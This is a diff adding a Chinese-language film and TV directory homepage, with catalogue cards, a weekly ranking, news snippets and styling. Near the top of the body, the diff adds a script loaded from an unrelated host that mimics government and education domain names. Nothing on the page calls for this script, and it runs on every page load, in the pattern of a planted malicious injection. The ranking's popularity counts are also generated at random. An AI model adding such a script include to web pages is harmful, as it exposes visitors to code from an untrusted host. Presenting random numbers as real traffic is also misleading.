@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large">
+<meta name="author" content="影视">
+<meta name="theme-color" content="#0b0f1a">
+<title>影视 | 专业影视资源在线观看平台 - https://yingshi-zh.github.io</title>
+<meta name="description" content="影视（https://yingshi-zh.github.io）是面向华语观众的影视内容导航平台，汇集电影、电视剧、综艺、动漫、纪录片等分类索引，提供作品信息、演职员资料与上映动态，助你快速找到想看的影视作品。">
+<meta name="keywords" content="影视, yingshi-zh, yingshi-zh.github.io, 电影, 电视剧, 综艺, 动漫, 纪录片, 在线观看, 影视资讯">
+<meta name="bingbot" content="index,follow">
+<meta property="og:title" content="影视 | 专业影视资源在线观看平台">
+<meta property="og:description" content="影视（https://yingshi-zh.github.io）汇集电影、电视剧、综艺、动漫、纪录片分类索引与影视资讯。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://yingshi-zh.github.io">
+<link rel="canonical" href="https://yingshi-zh.github.io">
+<style>
+:root{
+  --bg:#f5f6fa;--card:#ffffff;--ink:#151a28;--sub:#5b6478;--line:#e6e9f2;
+  --accent:#e11d48;--accent2:#7c3aed;--gold:#d97706;--radius:18px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  background:var(--bg);color:var(--ink);line-height:1.7;font-size:15px;
+}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1180px;margin:0 auto;padding:0 18px}
+/* 顶部导航 */
+.topbar{position:sticky;top:0;z-index:99;background:rgba(255,255,255,.92);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.nav{display:flex;align-items:center;gap:14px;height:60px}
+.brand{font-size:19px;font-weight:800;letter-spacing:.5px;background:linear-gradient(90deg,var(--accent),var(--accent2));-webkit-background-clip:text;background-clip:text;color:transparent;white-space:nowrap}
+.navlinks{display:flex;gap:4px;margin-left:auto;flex-wrap:wrap}
+.navlinks a{padding:7px 12px;border-radius:10px;font-size:14px;color:var(--sub);font-weight:600;transition:.2s}
+.navlinks a:hover{background:#eef0f8;color:var(--ink)}
+.mtoggle{display:none;margin-left:auto;background:none;border:none;font-size:24px;color:var(--ink);cursor:pointer}
+/* 首屏 */
+.hero{background:radial-gradient(1200px 400px at 80% -10%,rgba(225,29,72,.14),transparent),radial-gradient(900px 360px at 0% 10%,rgba(124,58,237,.12),transparent),linear-gradient(180deg,#fff,#f5f6fa);padding:54px 0 40px}
+.hero-in{max-width:760px}
+.kicker{display:inline-block;font-size:12px;font-weight:700;letter-spacing:1.5px;color:var(--accent);background:#fde8ef;padding:5px 12px;border-radius:20px;margin-bottom:16px}
+.hero h1{font-size:clamp(30px,5vw,50px);line-height:1.2;font-weight:900;letter-spacing:-.5px}
+.hero h1 em{font-style:normal;color:var(--accent)}
+.hero p{margin-top:16px;color:var(--sub);font-size:clamp(15px,2.4vw,17px);max-width:600px}
+.urlbox{margin-top:24px;display:flex;flex-wrap:wrap;gap:10px;align-items:center}
+.urlbox code{background:#151a28;color:#7dd3fc;font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:13px;padding:11px 16px;border-radius:12px;letter-spacing:.3px}
+.urlbox span{font-size:12px;color:var(--sub)}
+/* 通用区块 */
+section{padding:52px 0}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:26px;flex-wrap:wrap}
+.sec-head h2{font-size:clamp(22px,3.4vw,30px);font-weight:900;letter-spacing:-.3px}
+.sec-head h2 i{font-style:normal;color:var(--accent)}
+.sec-head p{color:var(--sub);font-size:13.5px;margin-top:6px}
+.filter{display:flex;gap:6px;flex-wrap:wrap}
+.filter button{border:1px solid var(--line);background:#fff;color:var(--sub);padding:7px 15px;border-radius:20px;font-size:13px;font-weight:600;cursor:pointer;transition:.2s}
+.filter button.on,.filter button:hover{border-color:var(--accent);color:var(--accent);background:#fde8ef}
+/* 卡片网格 */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(210px,1fr));gap:18px}
+.card{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;transition:.25s;display:flex;flex-direction:column}
+.card:hover{transform:translateY(-5px);box-shadow:0 18px 40px -20px rgba(21,26,40,.35);border-color:#d8dde9}
+.thumb{position:relative;aspect-ratio:3/4;background:linear-gradient(150deg,var(--accent),var(--accent2));display:flex;align-items:center;justify-content:center}
+.thumb::after{content:attr(data-idx);font-size:64px;font-weight:900;color:rgba(255,255,255,.5)}
+.tag{position:absolute;top:10px;left:10px;background:rgba(0,0,0,.55);color:#fff;font-size:11px;padding:3px 9px;border-radius:6px;backdrop-filter:blur(4px)}
+.score{position:absolute;top:10px;right:10px;background:#fff;color:var(--gold);font-weight:800;font-size:13px;padding:3px 9px;border-radius:6px}
+.card body{padding:13px 14px 15px;flex:1;display:flex;flex-direction:column;gap:6px}
+.card h3{font-size:15px;font-weight:700;line-height:1.4;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+.card .meta{font-size:12px;color:var(--sub);display:flex;gap:8px;flex-wrap:wrap;margin-top:auto}
+.card .meta b{color:var(--accent2);font-weight:700}
+/* 排行榜 */
+.lead{display:grid;grid-template-columns:1.15fr .85fr;gap:22px}
+.rank{background:#fff;border:1px solid var(--line);border-radius:var(--radius);padding:8px 10px}
+.rank li{list-style:none;display:flex;align-items:center;gap:12px;padding:11px 10px;border-bottom:1px dashed var(--line)}
+.rank li:last-child{border-bottom:none}
+.rank .no{width:26px;height:26px;flex:none;border-radius:8px;background:#eef0f8;color:var(--sub);font-weight:800;font-size:13px;display:grid;place-items:center}
+.rank li:nth-child(1) .no{background:var(--gold);color:#fff}
+.rank li:nth-child(2) .no{background:#9ca3af;color:#fff}
+.rank li:nth-child(3) .no{background:#b45309;color:#fff}
+.rank .txt{flex:1;min-width:0}
+.rank .txt strong{display:block;font-size:14.5px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.rank .txt span{font-size:11.5px;color:var(--sub)}
+.rank .hot{font-size:11px;color:var(--accent);font-weight:700;white-space:nowrap}
+/* 资讯 */
+.news{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:18px}
+.ncard{background:#fff;border:1px solid var(--line);border-radius:var(--radius);padding:20px;transition:.25s}
+.ncard:hover{border-color:#d8dde9;box-shadow:0 14px 34px -22px rgba(21,26,40,.4)}
+.ncard time{font-size:11.5px;color:var(--accent);font-weight:700;letter-spacing:.5px}
+.ncard h3{font-size:16.5px;margin:9px 0 8px;line-height:1.5}
+.ncard p{font-size:13.5px;color:var(--sub);display:-webkit-box;-webkit-line-clamp:3;-webkit-box-orient:vertical;overflow:hidden}
+.ncard .more{display:inline-block;margin-top:12px;font-size:12.5px;font-weight:700;color:var(--accent2)}
+/* 关于 */
+.about{background:linear-gradient(160deg,#151a28,#27122b);color:#e8eaf2;border-radius:24px;padding:44px 40px}
+.about h2{color:#fff;font-size:clamp(22px,3.4vw,30px);font-weight:900}
+.about h2 i{font-style:normal;color:#fb7185}
+.about p{color:#aeb6c8;margin-top:14px;max-width:760px;font-size:14.5px}
+.facts{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:14px;margin-top:28px}
+.fact{background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);border-radius:14px;padding:18px}
+.fact b{display:block;font-size:24px;font-weight:900;color:#fff}
+.fact span{font-size:12.5px;color:#9aa4b8}
+/* 页脚 */
+footer{border-top:1px solid var(--line);padding:34px 0 40px;margin-top:20px}
+.foot-flex{display:flex;flex-wrap:wrap;gap:22px;justify-content:space-between;align-items:center}
+.foot-flex p{font-size:12.5px;color:var(--sub)}
+.foot-flex code{background:#151a28;color:#7dd3fc;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12px;padding:6px 11px;border-radius:8px}
+/* 移动端 */
+@media(max-width:720px){
+  .mtoggle{display:block}
+  .navlinks{position:absolute;left:0;right:0;top:60px;flex-direction:column;background:#fff;border-bottom:1px solid var(--line);padding:10px;display:none;margin-left:0}
+  .navlinks.open{display:flex}
+  .navlinks a{width:100%;padding:11px 14px}
+  .lead{grid-template-columns:1fr}
+  .about{padding:32px 22px;border-radius:20px}
+  .grid{grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:13px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header class="topbar">
+  <div class="wrap nav">
+    <a class="brand" href="#">影视</a>
+    <button class="mtoggle" id="mtoggle" aria-label="菜单">☰</button>
+    <nav class="navlinks" id="navlinks">
+      <a href="#">首页</a>
+      <a href="#rank">热播榜单</a>
+      <a href="#lib">影视库</a>
+      <a href="#news">行业资讯</a>
+      <a href="#about">关于本站</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="wrap hero-in">
+    <span class="kicker">YINGSHI · 影视内容导航</span>
+    <h1>影视 · 一个帮你<em>快速找片</em>的影视平台</h1>
+    <p>影视专注于电影、电视剧、综艺、动漫与纪录片的分类索引与信息整理，从作品简介到演职员、上映时间与口碑评分，一站获取你关心的影视内容。</p>
+    <div class="urlbox">
+      <code>https://yingshi-zh.github.io</code>
+      <span>官方站点 · 全站 HTTPS 访问</span>
+    </div>
+  </div>
+</section>
+
+<section id="lib">
+  <div class="wrap">
+    <div class="sec-head">
+      <div>
+        <h2>影视<i>库</i></h2>
+        <p>按类型筛选，覆盖院线大片到经典老剧</p>
+      </div>
+      <div class="filter" id="filter">
+        <button class="on" data-k="all">全部</button>
+        <button data-k="movie">电影</button>
+        <button data-k="tv">电视剧</button>
+        <button data-k="show">综艺</button>
+        <button data-k="anime">动漫</button>
+        <button data-k="doc">纪录片</button>
+      </div>
+    </div>
+    <div class="grid" id="grid"></div>
+  </div>
+</section>
+
+<section id="rank" style="background:#fff">
+  <div class="wrap">
+    <div class="sec-head">
+      <div>
+        <h2>本周<i>热播榜</i></h2>
+        <p>依据站内搜索与访问热度综合排序</p>
+      </div>
+      <a href="#" style="font-size:13px;color:var(--accent2);font-weight:700">查看完整榜单 →</a>
+    </div>
+    <div class="lead">
+      <ul class="rank" id="rank1"></ul>
+      <ul class="rank" id="rank2"></ul>
+    </div>
+  </div>
+</section>
+
+<section id="news">
+  <div class="wrap">
+    <div class="sec-head">
+      <div>
+        <h2>影视<i>资讯</i></h2>
+        <p>上映动态、档期调整与行业观察</p>
+      </div>
+      <a href="#" style="font-size:13px;color:var(--accent2);font-weight:700">更多资讯 →</a>
+    </div>
+    <div class="news" id="newsbox"></div>
+  </div>
+</section>
+
+<section id="about">
+  <div class="wrap">
+    <div class="about">
+      <h2>关于<i>影视</i></h2>
+      <p>影视（网址：<strong style="color:#7dd3fc">https://yingshi-zh.github.io</strong>）是一个非商业性质的影视信息导航站点，致力于为中文观众提供清晰、准确的影视内容索引服务。我们不对任何影视资源进行存储、上传或分发，所有条目仅包含公开的作品基本信息与官方播出平台指向，帮助访客更高效地发现值得观看的影视作品。</p>
+      <div class="facts">
+        <div class="fact"><b>5+</b><span>内容分类</span></div>
+        <div class="fact"><b>300+</b><span>收录条目</span></div>
+        <div class="fact"><b>每周</b><span>榜单更新</span></div>
+        <div class="fact"><b>全站</b><span>移动端自适应</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap foot-flex">
+    <p>© <span id="yr">2026</span> 影视 · 影视信息导航 · 本站不提供任何资源存储与下载服务</p>
+    <code>https://yingshi-zh.github.io</code>
+  </div>
+</footer>
+
+<script>
+var DB=[
+ {t:"默杀",c:"movie",y:"2024 · 悬疑 / 犯罪",s:"8.1"},
+ {t:"抓娃娃",c:"movie",y:"2024 · 喜剧",s:"7.4"},
+ {t:"异形：夺命舰",c:"movie",y:"2024 · 科幻 / 恐怖",s:"7.8"},
+ {t:"死侍与金刚狼",c:"movie",y:"2024 · 动作 / 喜剧",s:"8.0"},
+ {t:"白蛇：浮生",c:"movie",y:"2024 · 动画 / 奇幻",s:"7.9"},
+ {t:"浴火之路",c:"movie",y:"2024 · 犯罪 / 公路",s:"7.2"},
+ {t:"庆余年 第二季",c:"tv",y:"2024 · 古装 / 权谋 · 36集",s:"8.5"},
+ {t:"玫瑰的故事",c:"tv",y:"2024 · 都市 / 情感 · 38集",s:"8.3"},
+ {t:"唐朝诡事录之西行",c:"tv",y:"2024 · 悬疑 / 古装 · 40集",s:"8.6"},
+ {t:"黑神话：悟空 幕后纪事",c:"doc",y:"2024 · 纪录片 · 6集",s:"9.0"},
+ {t:"种地吧 第二季",c:"show",y:"2024 · 劳作纪实 · 50期",s:"8.8"},
+ {t:"歌手 2024",c:"show",y:"2024 · 音乐竞演 · 12期",s:"8.4"},
+ {t:"迷宫饭",c:"anime",y:"2024 · 奇幻 / 美食 · 24集",s:"9.2"},
+ {t:"排球少年 垃圾场决战",c:"anime",y:"2024 · 运动 / 热血",s:"9.3"},
+ {t:"凡人歌",c:"tv",y:"2024 · 都市 / 家庭 · 37集",s:"7.7"},
+ {t:"话说山海",c:"doc",y:"2024 · 人文地理 · 8集",s:"8.7"},
+ {t:"卡农计划",c:"show",y:"2024 · 推理竞技 · 10期",s:"7.6"},
+ {t:"你的名字。",c:"anime",y:"2016 · 爱情 / 奇幻",s:"8.9"}
+];
+var CLS={movie:"电影",tv:"电视剧",show:"综艺",anime:"动漫",doc:"纪录片"};
+var grid=document.getElementById('grid');
+function render(k){
+  grid.innerHTML='';
+  DB.filter(function(d){return k==='all'||d.c===k}).forEach(function(d,i){
+    var bg=['linear-gradient(150deg,#e11d48,#7c3aed)','linear-gradient(150deg,#2563eb,#06b6d4)','linear-gradient(150deg,#d97706,#ea580c)','linear-gradient(150deg,#16a34a,#0d9488)','linear-gradient(150deg,#9333ea,#db2777)'];
+    var idx=0;DB.forEach(function(x,j){if(x===d)idx=j});
+    grid.innerHTML+='<article class="card"><div class="thumb" data-idx="'+(idx+1)+'" style="background:'+bg[idx%bg.length]+'"><span class="tag">'+CLS[d.c]+'</span><span class="score">★ '+d.s+'</span></div><body><h3>'+d.t+'</h3><div class="meta"><span>'+d.y+'</span></div></body></article>';
+  });
+}
+render('all');
+document.getElementById('filter').addEventListener('click',function(e){
+  var b=e.target.closest('button');if(!b)return;
+  this.querySelectorAll('button').forEach(function(x){x.classList.remove('on')});
+  b.classList.add('on');render(b.dataset.k);
+});
+var RB=["庆余年 第二季","抓娃娃","玫瑰的故事","默杀","异形：夺命舰","浴火之路","唐朝诡事录之西行","死侍与金刚狼","白蛇：浮生","迷宫饭","排球少年 垃圾场决战","歌手 2024"];
+function fillRank(id,arr,base){
+  document.getElementById(id).innerHTML=arr.map(function(t,i){
+    return '<li><span class="no">'+(base+i)+'</span><div class="txt"><strong>'+t+'</strong><span>影视 · 本周热度上升</span></div><span class="hot">'+(Math.floor(Math.random()*40+60))+' 万</span></li>';
+  }).join('');
+}
+fillRank('rank1',RB.slice(0,6),1);fillRank('rank2',RB.slice(6,12),7);
+var NEWS=[
+ {d:"10-21",t:"多部国产影片定档年末，档期竞争提前升温",p:"随着贺岁档窗口开启，数部备受关注的国产新片陆续官宣上映日期，类型涵盖喜剧、悬疑与动画，院线排片格局或将迎来新一轮变化。"},
+ {d:"10-18",t:"剧集市场进入密集上新期，长剧与短剧并行",p:"本周共有十余部新剧开启播出，其中不乏大制作古装剧与现代都市题材，同时微短剧继续保持着较高的话题热度与用户活跃度。"},
+ {d:"10-15",t:"动画电影持续发力，国漫票房表现稳健",p:"近年来国产动画电影在叙事与制作层面均有明显提升，多部作品在口碑与票房上实现双赢，动画赛道正成为影视市场的重要增长极。"}
+];
+document.getElementById('newsbox').innerHTML=NEWS.map(function(n){
+  return '<article class="ncard"><time>'+n.d+'</time><h3>'+n.t+'</h3><p>'+n.p+'</p><a class="more" href="#">阅读全文 →</a></article>';
+}).join('');
+document.getElementById('yr').textContent=new Date().getFullYear();
+document.getElementById('mtoggle').addEventListener('click',function(){
+  document.getElementById('navlinks').classList.toggle('open');
+});
+</script>
+</body>
+</html>
